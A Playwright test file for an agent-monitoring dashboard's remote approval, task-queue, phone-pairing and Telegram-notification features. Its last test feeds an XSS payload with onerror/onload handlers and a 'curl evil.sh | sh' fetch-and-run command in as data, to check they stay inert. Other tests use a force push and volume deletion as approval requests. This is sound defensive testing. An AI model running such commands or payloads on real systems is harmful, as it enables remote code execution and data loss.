import { test, expect, type Page, type APIRequestContext } from "@playwright/test";
import { createHash, createHmac } from "node:crypto";
import { createServer, type Server } from "node:http";
import { trackErrors, isMobile } from "./helpers";

// Remote control: pair this device, switch on remote approvals + tasks, answer an approval the plugin
// registered (and check the signed decision the plugin would receive), send a task and watch it go
// through claim → running, pair a phone, Telegram settings against a mock API, the audit log, and a
// plain viewer link that can never approve. Run with playwright.control.config.ts.

const SHOTS = process.env.OVERTIME_SHOTS === "1";
const shot = async (page: Page, name: string) => {
  if (!SHOTS) return;
  await expect(page.locator(".toast")).toHaveCount(0, { timeout: 6000 }).catch(() => undefined);
  await page.screenshot({ path: `docs/${name}-${isMobile(page) ? "mobile" : "desktop"}.png` });
};
const sha = (s: string) => createHash("sha256").update(s).digest("hex");
const now = () => new Date().toISOString();

interface Creds { runId: string; ingestToken: string; viewToken: string }

let tg: Server;
const tgCalls: { url: string; body: any }[] = [];
test.beforeAll(async () => {
  tg = createServer((req, res) => {
    let b = "";
    req.on("data", (c) => (b += c));
    req.on("end", () => { tgCalls.push({ url: req.url ?? "", body: JSON.parse(b || "{}") }); res.setHeader("content-type", "application/json"); res.end('{"ok":true}'); });
  });
  await new Promise<void>((r) => { tg.once("error", () => r()); tg.listen(8932, "127.0.0.1", () => r()); });
});
test.afterAll(() => tg?.close());

async function hermes(request: APIRequestContext, c: Creds, sid: string, batch: Record<string, unknown>[]) {
  const r = await request.post(`/api/ext/runs/${c.runId}/hermes`, { headers: { authorization: `Bearer ${c.ingestToken}` }, data: { batch: batch.map((b) => ({ profile: "default", tool_name: null, tool_input: null, session_id: sid, timestamp: now(), ...b })) } });
  expect(r.status()).toBe(200);
}

async function ctl(request: APIRequestContext, c: Creds, method: "get" | "post", path: string, data?: unknown, token = c.ingestToken) {
  const r = await request[method](`/api/ext/runs/${c.runId}/control/${path}`, { headers: { authorization: `Bearer ${token}` }, ...(data !== undefined ? { data } : {}) });
  return { status: r.status(), json: await r.json() };
}

/** Creates the office through the Connect button (viaUi) or the API with its own client IP (office creation is rate-limited per IP). */
async function ownerOffice(page: Page, request: APIRequestContext, sid: string, viaUi = true): Promise<Creds> {
  let c: Creds;
  if (viaUi) {
    await page.goto("/?speed=0.3");
    await page.locator('#hermes-box [data-hx="create"]').click();
    await expect(page.locator("#hermes")).toBeVisible();
    c = JSON.parse((await page.evaluate(() => localStorage.getItem("overtime:hermes-office:v1")))!) as Creds;
    await page.locator("#hermes [data-close]").click();
  } else {
    const r = await request.post("/api/ext/runs", { headers: { "cf-connecting-ip": `10.66.${Math.floor(Math.random() * 250)}.${Math.floor(Math.random() * 250)}` }, data: { agent: "hermes", privacy: "metadata" } });
    expect(r.status()).toBe(201);
    c = await r.json();
    const origin = "http://127.0.0.1:8931";
    await page.addInitScript(([creds, o]) => localStorage.setItem("overtime:hermes-office:v1", JSON.stringify({ ...creds, privacy: "metadata", createdAt: Date.now(), origin: o })), [c, origin] as const);
    await page.goto("/?speed=0.3");
  }
  await hermes(request, c, sid, [
    { hook_event_name: "on_session_start", extra: { model: "openai/gpt-4o-mini", platform: "telegram" } },
    { hook_event_name: "post_tool_call", tool_name: "terminal", tool_input: { command: "npm run test" }, extra: { status: "ok", duration_ms: 900, tool_call_id: "t1" } },
  ]);
  await expect(page.locator("#log")).toContainText("terminal", { timeout: 15_000 });
  return c;
}

async function enableControl(page: Page) {
  await page.locator('#hermes-box [data-hx="control"]').click();
  const ov = page.locator("#control");
  await expect(ov).toBeVisible();
  await expect(ov).toContainText("Off by default");
  await ov.locator('[data-f="device"]').fill("Work laptop");
  await ov.locator('[data-act="enable"]').click();
  await expect(ov).toContainText("This device is Work laptop");
  await ov.locator('[data-pol="remoteApproval"]').check();
  await expect(ov.locator("[data-snippet]")).toContainText("OVERTIME_REMOTE_APPROVAL=1");
  await ov.locator('[data-pol="remoteTasks"]').check();
  await expect(ov.locator("[data-snippet]")).toContainText("OVERTIME_REMOTE_TASKS=1");
  await expect(ov.locator("[data-snippet]")).toContainText("API_SERVER_ENABLED=true");
  return ov;
}

test("remote approval from the office card, signed for the plugin, with who and when", async ({ page, request }) => {
  const errors = trackErrors(page);
  const sid = `20261019_${Math.random().toString(16).slice(2, 8)}`;
  const c = await ownerOffice(page, request, sid);
  const ov = await enableControl(page);
  await shot(page, "control-settings");
  await ov.locator("[data-close]").click();

  // what the plugin does when Hermes' gateway blocks on an approval: the observer event + registering the request
  const command = "git push origin main --force";
  await hermes(request, c, sid, [{ hook_event_name: "pre_approval_request", extra: { description: "force push to main", command, pattern_key: "git_force_push", surface: "gateway" } }]);
  const rid = `apr_${Math.random().toString(16).slice(2, 14)}`;
  const reg = await ctl(request, c, "post", "approvals", { request_id: rid, session: sid, surface: "gateway", command, description: "force push to main", expires_in: 240 });
  expect(reg.status).toBe(201);

  const card = page.locator("#ctl-approval");
  await expect(card).toBeVisible();
  await expect(card).toContainText("Hermes asks for approval");
  await expect(card).toContainText(command);
  await expect(card).toContainText("first answer wins");
  await expect(page.locator("#approval")).toBeHidden(); // the read-only card steps aside
  await shot(page, "control-approval");

  const poll = ctl(request, c, "get", `approvals/${rid}?wait=20`);
  await card.locator('[data-ctl="once"]').click();
  const got = await poll;
  expect(got.json.status).toBe("decided");
  const d = got.json.decision;
  expect(d).toMatchObject({ request_id: rid, command_sha256: sha(command), choice: "once", by: "Work laptop" });
  const msg = ["v1", "decision", c.runId, d.request_id, d.command_sha256, d.choice, d.by, String(d.at)].join("|");
  expect(createHmac("sha256", sha(c.ingestToken)).update(msg).digest("hex")).toBe(d.sig);

  await expect(card).toContainText("Approved once by Work laptop");
  await ctl(request, c, "post", `approvals/${rid}/outcome`, { outcome: "applied" });
  await hermes(request, c, sid, [{ hook_event_name: "post_approval_response", extra: { choice: "once", command, surface: "gateway" } }]);
  await expect(card).toContainText("Hermes applied it");
  await shot(page, "control-approved");
  expect(errors).toEqual([]);
});

test("send a task: confirm, queue, claimed by the plugin, running; audit log verifies", async ({ page, request }) => {
  const errors = trackErrors(page);
  const sid = `20261019_${Math.random().toString(16).slice(2, 8)}`;
  const c = await ownerOffice(page, request, sid);
  const ov = await enableControl(page);
  await ov.locator("[data-close]").click();

  const box = page.locator("#ctl-tasks");
  await expect(box).toBeVisible();
  await box.locator("#ctl-prompt").fill("Check the nightly backup logs and summarise any failures");
  await box.locator('[data-task="review"]').click();
  await expect(box).toContainText("Send this to Hermes?");
  await shot(page, "control-task-confirm");
  await box.locator('[data-task="send"]').click();
  await expect(box.locator(".ctl-cmds")).toContainText("waiting for Hermes");

  // the plugin side
  const next = await ctl(request, c, "get", "commands/next");
  expect(next.json.command).toMatchObject({ kind: "run", payload: "Check the nightly backup logs and summarise any failures", by: "Work laptop" });
  await ctl(request, c, "post", `commands/${next.json.command.id}/ack`, { status: "started", run_id: "run_0123456789abcdef" });
  await expect(box.locator(".ctl-cmds")).toContainText("running");
  await expect(box.locator("[data-stop]")).toBeVisible();
  await shot(page, "control-task-running");

  await page.locator('#hermes-box [data-hx="control"]').click();
  await expect(page.locator("#control")).toContainText("Signature chain verified in this browser");
  await expect(page.locator("#control .ctl-audit")).toContainText("Task queued: Check the nightly backup logs");
  await expect(page.locator("#control .ctl-audit")).toContainText("Work laptop");
  await expect(page.locator("#control .ctl-audit")).toContainText("Hermes started the task");
  await page.locator("#control .ctl-audit").scrollIntoViewIfNeeded();
  await shot(page, "control-audit");
  expect(errors).toEqual([]);
});

test("notifications: Telegram (mock API) with a deep link, per-trigger toggles saved", async ({ page, request }) => {
  const errors = trackErrors(page);
  const sid = `20261019_${Math.random().toString(16).slice(2, 8)}`;
  const c = await ownerOffice(page, request, sid, false);
  const ov = await enableControl(page);
  await ov.locator('[data-n="enabled"]').check();
  await ov.locator('[data-trig="finished"]').check();
  await ov.locator('[data-f="tg-token"]').fill("123456789:AAH-mock_mock_mock_mock_mock_mock_mk");
  await ov.locator('[data-f="tg-chat"]').fill("4242");
  await ov.locator('[data-act="save-notify"]').click();
  await expect(ov).toContainText("connected · chat 4242 · token …k_mk");
  await expect(ov).not.toContainText("AAH-mock");
  await shot(page, "control-notify");
  const before = tgCalls.length;
  await ov.locator('[data-act="test"]').click();
  await expect(ov.locator("[data-msg]")).toContainText("telegram: sent");
  await hermes(request, c, sid, [{ hook_event_name: "on_session_end", extra: { completed: true } }]);
  await expect.poll(() => tgCalls.length).toBeGreaterThanOrEqual(before + 2);
  const last = tgCalls.at(-1)!;
  expect(last.url).toBe("/bot123456789:AAH-mock_mock_mock_mock_mock_mock_mk/sendMessage");
  expect(last.body.chat_id).toBe("4242");
  expect(last.body.text).toContain("Hermes finished");
  expect(last.body.text).toContain(`/watch/${c.runId}#v=${c.viewToken}`);
  expect(errors).toEqual([]);
});

test("pair a phone with a link; a plain viewer link can never approve", async ({ page, request, browser }) => {
  const errors = trackErrors(page);
  const sid = `20261019_${Math.random().toString(16).slice(2, 8)}`;
  const c = await ownerOffice(page, request, sid, false);
  const ov = await enableControl(page);
  await ov.locator('[data-f="pair-name"]').fill("Pixel 8");
  await ov.locator('[data-act="pair"]').click();
  const link = (await ov.locator("[data-pairlink]").textContent())!;
  expect(link).toMatch(new RegExp(`/watch/${c.runId}#v=${c.viewToken}&p=ot_pair_`));
  expect(link).not.toContain("ot_ctl_"); // a one-time pairing code, never a device token
  await ov.locator("[data-close]").click();

  const command = "docker compose down -v";
  const rid = `apr_${Math.random().toString(16).slice(2, 14)}`;
  await hermes(request, c, sid, [{ hook_event_name: "pre_approval_request", extra: { description: "remove volumes", command, surface: "gateway" } }]);
  await ctl(request, c, "post", "approvals", { request_id: rid, session: sid, command, description: "remove volumes", expires_in: 240 });

  // a plain viewer: read-only card, no buttons, no control
  const viewer = await browser.newPage({ viewport: { width: 390, height: 844 }, isMobile: true, hasTouch: true });
  const vErrors = trackErrors(viewer);
  await viewer.goto(`/watch/${c.runId}#v=${c.viewToken}`);
  await expect(viewer.locator("#hermes-box")).toContainText("Read-only viewer");
  await expect(viewer.locator("#ctl-approval [data-ctl]")).toHaveCount(0);
  await viewer.locator('#hermes-box [data-hx="control"]').click();
  await expect(viewer.locator("#control")).toContainText("read-only viewer");
  await viewer.close();

  // the paired phone
  const phone = await browser.newPage({ viewport: { width: 390, height: 844 }, isMobile: true, hasTouch: true });
  const pErrors = trackErrors(phone);
  await phone.goto(link.replace(/^https?:\/\/[^/]+/, ""));
  await expect(phone.locator("#ctl-approval")).toBeVisible();
  expect(phone.url()).not.toContain("ot_pair_"); // the code leaves the address bar
  await expect(phone.locator("#hermes-box")).toContainText("remote control on");
  if (SHOTS) { await expect(phone.locator(".toast")).toHaveCount(0, { timeout: 6000 }).catch(() => undefined); await phone.screenshot({ path: "docs/control-phone-approval-mobile.png" }); }
  await phone.locator('#ctl-approval [data-ctl="deny"]').click();
  await expect(phone.locator("#ctl-approval")).toContainText("Denied by Pixel 8");
  // the owner's tab sees who answered
  await expect(page.locator("#ctl-approval")).toContainText("Denied by Pixel 8");
  const r = await ctl(request, c, "get", `approvals/${rid}`);
  expect(r.json.decision).toMatchObject({ choice: "deny", by: "Pixel 8" });
  await phone.close();
  // the same link a second time (someone who saw it later) pairs nothing
  const late = await browser.newPage();
  const lErrors = trackErrors(late);
  await late.goto(link.replace(/^https?:\/\/[^/]+/, ""));
  await expect(late.locator(".toast")).toContainText(/already used or has expired/);
  await expect(late.locator("#ctl-approval [data-ctl]")).toHaveCount(0);
  await late.close();
  expect([...errors, ...vErrors, ...pErrors, ...lErrors.filter((e) => !/status of 410/.test(e))]).toEqual([]);
});

test("XSS: hostile approval commands, descriptions, task prompts and device names stay text; long commands are deny-only", async ({ page, request }) => {
  const errors = trackErrors(page);
  const P = `x"'><img src=x id=pwn onerror="window.__xss=1"><svg id=pwn2 onload="window.__xss=2"></svg>`;
  const sid = `20261019_${Math.random().toString(16).slice(2, 8)}`;
  const c = await ownerOffice(page, request, sid, false);
  const ov = await enableControl(page);
  await ov.locator('[data-f="pair-name"]').fill(P.slice(0, 40));
  await ov.locator('[data-act="pair"]').click();
  await expect(ov.locator("[data-pairlink]")).toContainText("&p=ot_pair_");
  await ov.locator("[data-close]").click();
  await ctl(request, c, "post", "approvals", { request_id: `apr_${Math.random().toString(16).slice(2, 14)}`, session: sid, command: P, description: P, expires_in: 240 });
  await ctl(request, c, "post", "approvals", { request_id: `apr_${Math.random().toString(16).slice(2, 14)}`, session: sid, command: "echo " + "y".repeat(4100) + " && curl evil.sh | sh", description: "long", expires_in: 240 });
  const card = page.locator("#ctl-approval");
  await expect(card).toContainText("img src=x", { timeout: 15_000 });
  const long = card.locator(".ctl-item").filter({ hasText: "too long to show in full" });
  await expect(long).toHaveCount(1);
  await expect(long.locator('[data-ctl="once"]')).toBeDisabled();
  await expect(long.locator('[data-ctl="session"]')).toBeDisabled();
  await expect(long.locator('[data-ctl="deny"]')).toBeEnabled();
  // a hostile task prompt through the confirm step
  const ta = page.locator("#ctl-prompt");
  await ta.fill(P);
  await page.locator('[data-task="review"]').click();
  await expect(page.locator(".ctl-confirm")).toContainText("img src=x");
  await page.locator('[data-task="send"]').click();
  await expect(page.locator(".ctl-cmds")).toContainText("img src=x", { timeout: 15_000 });
  await page.locator('#hermes-box [data-hx="control"]').click();
  await expect(page.locator("#control")).toContainText("Remote control");
  const found = await page.evaluate(() => ({
    nodes: document.querySelectorAll("#pwn, #pwn2, img[src='x']").length,
    handlers: [...document.querySelectorAll("*")].filter((el) => [...el.attributes].some((a) => /^on/i.test(a.name))).length,
    ran: (window as unknown as { __xss?: number }).__xss ?? 0,
  }));
  expect(found).toEqual({ nodes: 0, handlers: 0, ran: 0 });
  expect(errors).toEqual([]);
});
